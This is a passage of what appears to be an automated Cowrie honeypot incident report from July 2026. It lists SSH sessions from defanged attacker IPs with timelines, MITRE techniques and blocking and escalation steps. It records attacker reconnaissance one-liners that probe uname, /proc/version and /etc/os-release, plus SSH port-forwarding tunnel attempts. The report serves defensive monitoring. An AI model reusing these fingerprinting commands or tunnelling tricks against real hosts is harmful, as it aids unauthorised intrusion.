| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:43:01` | `cowrie.session.connect` |
| `2026-07-30 02:43:01` | `cowrie.client.version` |
| `2026-07-30 02:43:01` | `cowrie.client.kex` |
| `2026-07-30 02:43:03` | `cowrie.login.success` |
| `2026-07-30 02:43:04` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f385d35ee35

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:43 |
| **Last Seen** | 2026-07-30 02:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:43:47` | `cowrie.session.connect` |
| `2026-07-30 02:43:48` | `cowrie.client.version` |
| `2026-07-30 02:43:48` | `cowrie.client.kex` |
| `2026-07-30 02:43:49` | `cowrie.login.success` |
| `2026-07-30 02:43:50` | `cowrie.session.params` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.success` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.command.input` |
| `2026-07-30 02:43:50` | `cowrie.log.closed` |
| `2026-07-30 02:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4846ea016c40

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:45 |
| **Last Seen** | 2026-07-30 02:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:45:17` | `cowrie.session.connect` |
| `2026-07-30 02:45:18` | `cowrie.client.version` |
| `2026-07-30 02:45:18` | `cowrie.client.kex` |
| `2026-07-30 02:45:19` | `cowrie.login.success` |
| `2026-07-30 02:45:20` | `cowrie.session.params` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.success` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.command.input` |
| `2026-07-30 02:45:20` | `cowrie.log.closed` |
| `2026-07-30 02:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519d93345cf0

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-07-30 02:56 |
| **Last Seen** | 2026-07-30 02:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:56:34` | `cowrie.session.connect` |
| `2026-07-30 02:56:34` | `cowrie.client.version` |
| `2026-07-30 02:56:34` | `cowrie.client.kex` |
| `2026-07-30 02:56:36` | `cowrie.login.success` |
| `2026-07-30 02:56:36` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4169afb420d8

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-30 02:56 |
| **Last Seen** | 2026-07-30 02:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:56:42` | `cowrie.session.connect` |
| `2026-07-30 02:56:42` | `cowrie.client.version` |
| `2026-07-30 02:56:42` | `cowrie.client.kex` |
| `2026-07-30 02:56:45` | `cowrie.login.success` |
| `2026-07-30 02:56:45` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-845f0bd5e450

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-07-30 03:03 |
| **Last Seen** | 2026-07-30 03:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:03:16` | `cowrie.session.connect` |
| `2026-07-30 03:03:17` | `cowrie.client.version` |
| `2026-07-30 03:03:17` | `cowrie.client.kex` |
| `2026-07-30 03:03:18` | `cowrie.login.success` |
| `2026-07-30 03:03:19` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc8dcc1ceff

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-07-30 03:03 |
| **Last Seen** | 2026-07-30 03:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:03:25` | `cowrie.session.connect` |
| `2026-07-30 03:03:25` | `cowrie.client.version` |
| `2026-07-30 03:03:25` | `cowrie.client.kex` |
| `2026-07-30 03:03:28` | `cowrie.login.success` |
| `2026-07-30 03:03:28` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23eb344c47da

| Field | Detail |
|---|---|
| **Source IP** | `203.129.217[.]70` |
| **First Seen** | 2026-07-30 03:11 |
| **Last Seen** | 2026-07-30 03:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:11:27` | `cowrie.session.connect` |
| `2026-07-30 03:11:29` | `cowrie.client.version` |
| `2026-07-30 03:11:29` | `cowrie.client.kex` |
| `2026-07-30 03:11:33` | `cowrie.login.success` |
| `2026-07-30 03:11:35` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.217[.]70` to AbuseIPDB if not already reported
- [ ] Block `203.129.217[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd89469063d5

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-07-30 03:13 |
| **Last Seen** | 2026-07-30 03:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:13:17` | `cowrie.session.connect` |
| `2026-07-30 03:13:18` | `cowrie.client.version` |
| `2026-07-30 03:13:18` | `cowrie.client.kex` |
| `2026-07-30 03:13:19` | `cowrie.login.success` |
| `2026-07-30 03:13:19` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e0bd7d096e

| Field | Detail |
|---|---|
| **Source IP** | `117.223.152[.]94` |
| **First Seen** | 2026-07-30 03:15 |
| **Last Seen** | 2026-07-30 03:16 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:15:53` | `cowrie.session.connect` |
| `2026-07-30 03:15:57` | `cowrie.client.version` |
| `2026-07-30 03:15:57` | `cowrie.client.kex` |
| `2026-07-30 03:16:01` | `cowrie.login.success` |
| `2026-07-30 03:16:02` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.223.152[.]94` to AbuseIPDB if not already reported
- [ ] Block `117.223.152[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367c21f7d887

| Field | Detail |
|---|---|
| **Source IP** | `34.156.51[.]86` |
| **First Seen** | 2026-07-30 03:15 |
| **Last Seen** | 2026-07-30 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:15:58` | `cowrie.session.connect` |
| `2026-07-30 03:15:58` | `cowrie.login.success` |
| `2026-07-30 03:15:59` | `cowrie.session.params` |
| `2026-07-30 03:15:59` | `cowrie.command.input` |
| `2026-07-30 03:15:59` | `cowrie.command.input` |
| `2026-07-30 03:15:59` | `cowrie.command.failed` |
| `2026-07-30 03:15:59` | `cowrie.command.input` |
| `2026-07-30 03:15:59` | `cowrie.log.closed` |
| `2026-07-30 03:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.51[.]86` to AbuseIPDB if not already reported
- [ ] Block `34.156.51[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a946857f9a

| Field | Detail |
|---|---|
| **Source IP** | `34.156.51[.]86` |
| **First Seen** | 2026-07-30 03:16 |
| **Last Seen** | 2026-07-30 03:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:16:07` | `cowrie.session.connect` |
| `2026-07-30 03:16:07` | `cowrie.login.success` |
| `2026-07-30 03:16:07` | `cowrie.session.params` |
| `2026-07-30 03:16:07` | `cowrie.command.input` |
| `2026-07-30 03:16:07` | `cowrie.command.failed` |
| `2026-07-30 03:16:17` | `cowrie.log.closed` |
| `2026-07-30 03:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.51[.]86` to AbuseIPDB if not already reported
- [ ] Block `34.156.51[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e63fa5edd12f

| Field | Detail |
|---|---|
| **Source IP** | `34.156.51[.]86` |
| **First Seen** | 2026-07-30 03:16 |
| **Last Seen** | 2026-07-30 03:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:16:09` | `cowrie.session.connect` |
| `2026-07-30 03:16:09` | `cowrie.login.success` |
| `2026-07-30 03:16:09` | `cowrie.session.params` |
| `2026-07-30 03:16:09` | `cowrie.command.input` |
| `2026-07-30 03:16:17` | `cowrie.log.closed` |
| `2026-07-30 03:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.51[.]86` to AbuseIPDB if not already reported
- [ ] Block `34.156.51[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e17c174ac5d4

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-07-30 03:16 |
| **Last Seen** | 2026-07-30 03:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:16:12` | `cowrie.session.connect` |
| `2026-07-30 03:16:12` | `cowrie.client.version` |
| `2026-07-30 03:16:12` | `cowrie.client.kex` |
| `2026-07-30 03:16:14` | `cowrie.login.success` |
| `2026-07-30 03:16:14` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76283a8b3f6

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-07-30 03:18 |
| **Last Seen** | 2026-07-30 03:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:18:05` | `cowrie.session.connect` |
| `2026-07-30 03:18:06` | `cowrie.client.version` |
| `2026-07-30 03:18:06` | `cowrie.client.kex` |
| `2026-07-30 03:18:08` | `cowrie.login.success` |
| `2026-07-30 03:18:09` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c215e03a98

| Field | Detail |
|---|---|
| **Source IP** | `125.215.199[.]37` |
| **First Seen** | 2026-07-30 03:18 |
| **Last Seen** | 2026-07-30 03:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:18:14` | `cowrie.session.connect` |
| `2026-07-30 03:18:14` | `cowrie.client.version` |
| `2026-07-30 03:18:14` | `cowrie.client.kex` |
| `2026-07-30 03:18:17` | `cowrie.login.success` |
| `2026-07-30 03:18:17` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.215.199[.]37` to AbuseIPDB if not already reported
- [ ] Block `125.215.199[.]37` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f40dd9fae8c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 03:19 |
| **Last Seen** | 2026-07-30 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:19:51` | `cowrie.session.connect` |
| `2026-07-30 03:19:51` | `cowrie.client.version` |
| `2026-07-30 03:19:51` | `cowrie.client.kex` |
| `2026-07-30 03:19:52` | `cowrie.login.success` |
| `2026-07-30 03:19:52` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:19:52` | `cowrie.direct-tcpip.data` |
| `2026-07-30 03:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9722cde3eaf

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:06` | `cowrie.session.connect` |
| `2026-07-30 03:21:06` | `cowrie.client.version` |
| `2026-07-30 03:21:07` | `cowrie.client.kex` |
| `2026-07-30 03:21:07` | `cowrie.login.success` |
| `2026-07-30 03:21:08` | `cowrie.session.params` |
| `2026-07-30 03:21:08` | `cowrie.command.input` |
| `2026-07-30 03:21:09` | `cowrie.log.closed` |
| `2026-07-30 03:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96827410756e

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 72s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:07` | `cowrie.session.connect` |
| `2026-07-30 03:21:07` | `cowrie.client.version` |
| `2026-07-30 03:21:08` | `cowrie.client.kex` |
| `2026-07-30 03:22:19` | `cowrie.login.success` |
| `2026-07-30 03:22:20` | `cowrie.session.params` |
| `2026-07-30 03:22:20` | `cowrie.command.input` |
| `2026-07-30 03:22:20` | `cowrie.log.closed` |
| `2026-07-30 03:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53896672a67

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:08` | `cowrie.session.connect` |
| `2026-07-30 03:21:08` | `cowrie.client.version` |
| `2026-07-30 03:21:09` | `cowrie.client.kex` |
| `2026-07-30 03:21:09` | `cowrie.login.success` |
| `2026-07-30 03:21:12` | `cowrie.session.params` |
| `2026-07-30 03:21:12` | `cowrie.command.input` |
| `2026-07-30 03:21:12` | `cowrie.log.closed` |
| `2026-07-30 03:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3156d987841

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:09` | `cowrie.session.connect` |
| `2026-07-30 03:21:09` | `cowrie.client.version` |
| `2026-07-30 03:21:10` | `cowrie.client.kex` |
| `2026-07-30 03:21:10` | `cowrie.login.success` |
| `2026-07-30 03:21:11` | `cowrie.session.params` |
| `2026-07-30 03:21:11` | `cowrie.command.input` |
| `2026-07-30 03:21:12` | `cowrie.log.closed` |
| `2026-07-30 03:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7594974a92bf

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:10` | `cowrie.session.connect` |
| `2026-07-30 03:21:12` | `cowrie.client.version` |
| `2026-07-30 03:21:12` | `cowrie.client.kex` |
| `2026-07-30 03:21:13` | `cowrie.login.success` |
| `2026-07-30 03:21:14` | `cowrie.session.params` |
| `2026-07-30 03:21:14` | `cowrie.command.input` |
| `2026-07-30 03:21:14` | `cowrie.log.closed` |
| `2026-07-30 03:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2752b4b867

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:12` | `cowrie.session.connect` |
| `2026-07-30 03:21:12` | `cowrie.client.version` |
| `2026-07-30 03:21:12` | `cowrie.client.kex` |
| `2026-07-30 03:21:13` | `cowrie.login.success` |
| `2026-07-30 03:21:15` | `cowrie.session.params` |
| `2026-07-30 03:21:15` | `cowrie.command.input` |
| `2026-07-30 03:21:15` | `cowrie.log.closed` |
| `2026-07-30 03:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5c95116db5

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:15` | `cowrie.session.connect` |
| `2026-07-30 03:21:15` | `cowrie.client.version` |
| `2026-07-30 03:21:16` | `cowrie.client.kex` |
| `2026-07-30 03:21:36` | `cowrie.login.success` |
| `2026-07-30 03:21:38` | `cowrie.session.params` |
| `2026-07-30 03:21:38` | `cowrie.command.input` |
| `2026-07-30 03:21:38` | `cowrie.log.closed` |
| `2026-07-30 03:21:38` | `cowrie.session.closed` |

